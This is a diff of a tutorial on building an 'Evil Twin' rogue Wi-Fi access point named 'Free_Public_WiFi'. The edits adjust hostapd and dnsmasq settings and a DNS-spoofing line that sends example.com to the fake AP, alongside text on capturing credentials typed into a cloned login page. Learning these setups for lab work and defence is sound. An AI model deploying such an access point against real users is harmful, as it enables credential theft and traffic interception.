@@ -78,7 +78,7 @@ driver=nl80211
 ssid=Free_Public_WiFi
 hw_mode=g
 channel=6
-macaddr_acl=0
+auth_algs=1
 ignore_broadcast_ssid=0
 ```
 
@@ -106,7 +106,7 @@ sudo ifconfig wlan0_ap 192.168.1.1 netmask 255.255.255.0 up
 interface=wlan0_ap
 dhcp-range=192.168.1.10,192.168.1.100,12h
 dhcp-option=3,192.168.1.1 # Default Gateway
-dhcp-option=6,192.168.1.1 # DNS Server
+dhcp-option=6,8.8.8.8 # DNS Server
 ```
 
 Start the service:
@@ -166,6 +166,8 @@ sudo python3 -m http.server 80
 ```
 *Connect a device to your AP, navigate to `http://192.168.1.1`, submit some credentials, and watch them appear in cleartext via your network sniffer!*
 
+You can also use Apache2.
+
 ## DNS Spoofing
 
 The ultimate goal of an Evil Twin is often to redirect a user to a fake captive portal or a cloned login page. We can do this by lying about DNS records.
@@ -177,7 +179,7 @@ Stop your running `dnsmasq` process. Edit your `dnsmasq.conf` to redirect a targ
 
 Add this line to `dnsmasq.conf`:
 ```conf
-address=/[example.com/192.168.1.1](https://example.com/192.168.1.1)
+address=/example.com/192.168.1.1
 ```
 Restart `dnsmasq`.
 
